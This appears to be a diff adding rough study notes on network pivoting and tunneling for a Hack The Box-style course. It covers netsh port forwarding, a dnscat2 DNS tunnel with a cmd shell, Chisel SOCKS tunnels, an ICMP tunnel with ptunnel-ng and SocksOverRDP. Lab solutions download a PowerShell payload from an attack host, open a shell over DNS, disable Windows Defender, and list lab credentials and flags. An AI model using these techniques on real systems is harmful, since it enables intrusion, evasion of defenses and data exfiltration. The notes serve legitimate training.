@@ -456,3 +456,296 @@ $python2.7 client -py --server-ip PwnIP --server-port 9999
 $Socks4 127.0.0.1 9050
 -At last, from Pwnbox/PMVPN, students need to use proxychains to open Firefox and browse the root web page of the web server on port 80 of the internal network target 172.16.5.135:
 
+\\\\\\\\\\\\\\====================================
+Port Forwarding with Windows Netsh 
+Netsh is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
+-Finding routes
+Viewing the firewall configuration
+Adding proxies
+Creating port forwarding rules
+-We can use netsh.exe to forward all data received on a specific port (say 8080) to a remote host on a remote port. This can be performed using the below command.
+
+\\Using Netsh.exe to Port Forward
+$C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+
+\\Verifying Port Forward
+C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+
+After configuring the portproxy on our Windows-based pivot host, we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
+
+<test>Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)
+-$xfreerdp /v:<ip> /u:<user> /p:<pass>
+$C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
+C:\Windows\system32> netsh.exe interface portproxy show v4tov4
+$xfreerdp /v:10.129.15.150:8080 /u: /p: 
+
+\\\\\\\\\\\\\\==============================================
+DNS Tunneling with Dnscat2
+-Plink is a Windows command-line SSH tool from the PuTTY suite. Before Windows had a built-in SSH client, admins commonly used PuTTY to connect to other hosts and create dynamic port forwards or SOCKS proxies.
+-Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protoco
+
+\\Setting Up & Using dnscat2
+-If dnscat2 is not already set up on our attack host, we can do so using the following commands:
+\\Cloning dnscat2 and Setting Up the Server
+$ git clone https://github.com/iagox86/dnscat2.git
+-We can then start the dnscat2 server by executing the dnscat2 file.
+
+\\Starting the dnscat2 server
+$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+-After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 serv
+-use the client with the dnscat2 project or use dnscat2-powershell, a dnscat2 compatible PowerShell-based client that we can run from Windows targets to establish a tunnel with our dnscat2 server. 
+
+\\Cloning dnscat2-powershell to the Attack Host
+$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+scp ubuntu@<ip>:/home/targetfolder
+
+Once the dnscat2.ps1 file is on the target we can import it and run associated cmd-lets.
+
+\\Importing dnscat2.ps1
+PS C:\htb> Import-Module .\dnscat2.ps1
+After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server.
+$PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+
+\\Listing dnscat2 Options
+dnscat2>?
+\\Interacting with the Established Session
+$window -i 1
+
+<test>Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer
+$ git clone https://github.com/iagox86/dnscat2.git
+gem install bundler
+bundle install
+$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+scp ubuntu@<ip>:/home/targetfolder
+$xfreerdp /v: /u: /p:
+$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
+python3 -m http.server PWNPO
+
+PS C:\Windows\system32> (New-Object Net.WebClient).DownloadFile('http://10.10.14.17:9001/dnscat2-powershell/dnscat2.ps1', 'dnscat2.ps1')
+PS C:\htb> Import-Module .\dnscat2.ps1
+$PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+
+window -i 1
+type C:\Users\htb-student\Documents\flag.txt
+
+\\\\\\================================================
+SOCKS5 Tunneling with Chisel
+Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH.
+Chisel can create a client-server tunnel connection in a firewall restricted environment.
+. Let us consider a scenario where we have to tunnel our traffic to a webserver on the 172.16.5.0/23 networ
+
+\\Setting Up & Using Chisel
+Before we can use Chisel, we need to have it on our attack host. If we do not have Chisel on our attack host, we can clone the project repo using the command directly below:
+$ git clone https://github.com/jpillora/chisel.git
+
+We will need the programming language Go installed on our system to build the Chisel binary. With Go installed on the system, we can move into that directory and use go build to build the Chisel binar
+Note: Depending on the version of the glibc library installed on both (target and workstation) systems, there might be discrepancies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or we can use an older prebuilt version of chisel, which can be found in the Releases section of the GitHub repository.
+
+\\Building the Chisel Binary
+$ cd chisel
+go build
+
+It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "Tunneling with Chisel and SSF" and IppSec's walkthrough of the box Reddish. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his video.
+-Once the binary is built, we can use SCP to transfer it to the target pivot host.
+
+\\Transferring Chisel Binary to Pivot Host
+$ scp chisel ubuntu@10.129.202.64:~/
+
+Then we can start the Chisel server/listener.
+\\Running the Chisel Server on the Pivot Host
+$ ./chisel server -v -p 1234 --socks5
+-The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
+
+\\Connecting to the Chisel Server
+$ ./chisel client -v 10.129.202.64:1234 socks
+he Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080. Now we can modify our proxychains.conf file located at /etc/proxychains.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.
+
+\\Editing & Confirming proxychains.conf
+-We can use any text editor we would like to edit the proxychains.conf file, then confirm our configuration changes using tail.
+$$ tail -f /etc/proxychains.conf 
+-Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.
+
+\\Pivoting to the DC
+$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+\\Chisel Reverse Pivot
+-scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.
+-When the Chisel server has --reverse enabled, remotes can be prefixed with R to denote reversed
+-The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy.
+
+\\Starting the Chisel Server on our Attack Host
+$ sudo ./chisel server --reverse -v -p 1234 --socks5
+
+\\Connecting the Chisel Client to our Attack Host
+$ ./chisel client -v 10.10.14.17:1234 R:socks
+
+\\Editing & Confirming proxychains.conf
+$ tail -f /etc/proxychains.conf
+
+$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+\\OLder verrsion chisel
+https://github.com/jpillora/chisel/releases
+
+<Test>Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.
+$ wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
+$ gunzip chisel_1.7.6_linux_amd64.gz 
+scp chisel_1.7.6_linux_amd64 ubuntu@STMIP:~/
+
+ssh ubuntu@STMIP
+chmod +x chisel_1.7.6_linux_amd64
+./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5
+
+Then, from Pwnbox/PMVPN, students need to run chisel as a client to connect to the chisel server running on the Ubuntu pivot host:
+-chmod +x chisel_1.7.6_linux_amd64
+./chisel_1.7.6_linux_amd64 client -v STMIP:9001 socks
+-Students must ensure that the following proxychains SOCKS5 entry is found (and that the SOCKS4 default entry is commented out) within the proxychains.conf file on Pwnbox/PMVPN:
+add  socks5 127.0.0.1 1080
+$ tail -n2 /etc/proxychains.conf Students must ensure that the following proxychains SOCKS5 entry is found (and that the SOCKS4 default entry is commented out) within the proxychains.conf file on Pwnbox/PMVPN:
+$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
+Th3$eTunne1$@rent8oring!
+type \Documents\flag.txt
+
+$ scp chisel ubuntu@10.129.202.64:~/
+$ ./chisel server -v -p 1234 --socks5
+$ ./chisel client -v 10.129.202.64:1234 socks
+$$ tail -f /etc/proxychains.conf 
+$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+
+\\======================================================
+ICMP Tunneling with SOCKS
+ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.
+- ICMP tunneling would only work when ping responses are permitted within a firewalled network.
+- When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. 
+-The external server can validate this traffic and send an appropriate response, which is extremely useful for data exfiltration and creating pivot tunnels to an external server.
+-We will use the ptunnel-ng tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the ptunnel-ng client. We can start the ptunnel-ng server on the target pivot host. Let's start by setting up ptunnel-ng.
+
+\\Setting Up & Using ptunnel-ng
+-If ptunnel-ng is not on our attack host, we can clone the project using git.
+
+\\Cloning Ptunnel-ng
+$ git clone https://github.com/utoni/ptunnel-ng.git
+
+Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the
+ root of the ptunnel-ng directory.
+
+\\Building Ptunnel-ng with Autogen.sh
+$ sudo ./autogen.sh 
+If we want to transfer the entire repo and the files contained inside,
+ we will need to use the -r option with SCP.
+
+\\Alternative approach of building a static binary
+$ sudo apt install automake autoconf -y
+$ cd ptunnel-ng/
+$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+$ ./autogen.sh
+
+\\Transferring Ptunnel-ng to the Pivot Host
+$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+
+With ptunnel-ng on the target host, we can start the server-side of the ICMP tunnel using the command directly below.
+
+\\Starting the ptunnel-ng Server on the Target Host
+$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+The IP address following -r should be the IP of the jump-box we want ptunnel-ng to accept connections on
+-whatever IP is reachable from our attack host would be what we would use. We would benefit from using this same thinking & consideration during an actual engagement.
+-connect to the ptunnel-ng server (-p <ipAddressofTarget>) but ensure this happens through local port 2222 (-l2222). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.
+
+\\Connecting to ptunnel-ng Server from Attack Host
+$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+-With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).
+
+\\Tunneling an SSH connection through an ICMP Tunnel
+$ ssh -p2222 -lubuntu 127.0.0.1
+-If configured correctly, we will be able to enter credentials and have an SSH session all through the ICMP tunnel.
+
+On the client & server side of the connection, we will notice ptunnel-ng gives us session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way we can confirm that our traffic is passing from client to server utilizing ICMP.
+
+\\Viewing Tunnel Traffic Statistics
+-We may also use this tunnel and SSH to perform dynamic port forwarding to allow us to use proxychains in various ways.
+
+\\Enabling Dynamic Port Forwarding over SSH
+$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+
+-We could use proxychains with Nmap to scan targets on the internal network (172.16.5.x). Based on our discoveries, we can attempt to connect to the target.
+
+$ proxychains nmap -sV -sT 172.16.5.19 -p3389
+\\Network Traffic Analysis Considerations
+-confirm the tools we are using are performing as advertised and that we have set up & are operating them properly.
+-n the case of tunneling traffic through different protocols taught in this section with ICMP tunneling, we can benefit from analyzing the traffic we generate with a packet analyzer like Wireshark. Take a close look at the short clip below.
+
+-In the first part of this clip, a connection is established over SSH without using ICMP tunneling. We may notice that TCP & SSHv2 traffic is captured.
+Note: Consider the versions of GLIBC, make sure you are on par with the one on the target.
+
+<Test> Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.
+$ git clone https://github.com/utoni/ptunnel-ng.git
+$ sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+
+$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
+$ sudo ./ptunnel-ng -r10.129.202.64 -R22
+$ sudo ./ptunnel-ng/src/ptunnel-ng -r10.129.151.105 -R22
+
+$ sudo ./ptunnel-ng/src/ptunnel-ng -p10.129.151.105 -l2222 -r10.129.151.105 -R22
+$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
+$ ssh -p2222 -lubuntu 127.0.0.1
+$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
+Then, from Pwnbox/PMVPN, students need to use proxychains to connect to the DC on the internal network, utilizing the credentials victor:pass@123:
+proxychains nmap -sV -sT 172.16.5.19 -p3389
+$proxychains xfreerdp /v:<ip> /u: /p: /dynamic-resolution
+type .\Downloads\flag.txt.txt
+N3Tw0rkTunnelV1sion!
+
+\\\\\\\\\\\===============================================
+RDP and SOCKS Tunneling with SocksOverRDP
+-use tools available for Windows operating systems in these cases. SocksOverRDP is an example of a tool that uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows.
+-DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing.
+-this feature can also be used to tunnel arbitrary packets over the network. We can use SocksOverRDP to tunnel our custom packets and then proxy through it. We will use the tool Proxifier as our proxy server.
+-SocksOverRDP x64 Binaries  https://github.com/nccgroup/SocksOverRDP/releases
+-Proxifier Portable Binary  https://www.proxifier.com/download/#win-tab
+
+We can then connect to the target using xfreerdp and copy the SocksOverRDPx64.zip file to the target. From the Windows target, we will then need to load the SocksOverRDP.dll using regsvr32.exe.
+
+\\Loading SocksOverRDP.dll using regsvr32.ex
+$C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
+
+-Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080. We can use the credentials victor:pass@123 to connect to 172.16.5.19.
+-We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.
+-When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.
+
+\\Confirming the SOCKS Listener is Started
+$C:\Users\htb-student\Desktop\SocksOverRDP-x64> netstat -antb | findstr 1080
+-we can transfer Proxifier portable to the Windows 10 target (on the 10.129.x.x network), and configure it to forward all our packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port. See the clip below for a quick walkthrough of configuring Proxifier.
+
+\\Configuring Proxifier
+-With Proxifier configured and running, we can start mstsc.exe, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.
+
+\\RDP Performance Considerations
+- especially if we are managing multiple RDP sessions simultaneously. If this is the case, we can access the Experience tab in mstsc.exe and set Performance to Modem.
+
+<Test>Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.
+$python3 http.server 8000
+wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
+wget https://www.proxifier.com/download/ProxifierPE.zip
+unzip SocksOverRDP-x64.zip
+unzip ProxifierPE.zip
+xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
+After connecting successfully, and before downloading the two files and one directory, students can either uninstall or turn off Windows Defender (otherwise the DLL will not be allowed to be loaded and will get deleted automatically, and in case it does get deleted, students need to copy and paste it again), in here, it will be turned off, following the steps below:
+Thereon, students need to transfer the files SocksOverRDP-Plugin.dll, SocksOverRDP-Server.exe and the Proxifier PE director
+$regsvr32.exe SocksOverRDP-Plugin.dll
+-Afterward, students need to open mstsc.exe from within PowerShell and connect to the 
+internal DC at 172.16.5.19, using the credentials victor:pass@123:
+-Then, students need to transfer SocksOverRDP-Server.exe to the internal DC at 172.16.5.19, however, before that, they need to uninstall Windows Defender (otherwise the executable will be deleted constantly):
+PS>Uninstall-WindowsFeature -Name Windows-Defender
+Once uninstalled, students can copy and paste the executable to the DC:
+Subsequently, students need to run it as administrator:
+Thereon, students need to run the Proxifier executable as administrator:
+-Once opened, students need to click on Profile --> Proxy Servers...
+-Students need to set 127.0.0.1:1080 as the proxy's socket and use SOCKS5:
+-At last, students need to use mstsc.exe to connect to the internal node at 172.16.6.155 
+using the credentials jason:WellConnected123!:
+-Once successfully connected, students will find the flag H0pping@roundwithRDP! on the desktop:
+
+-Skills Assessment
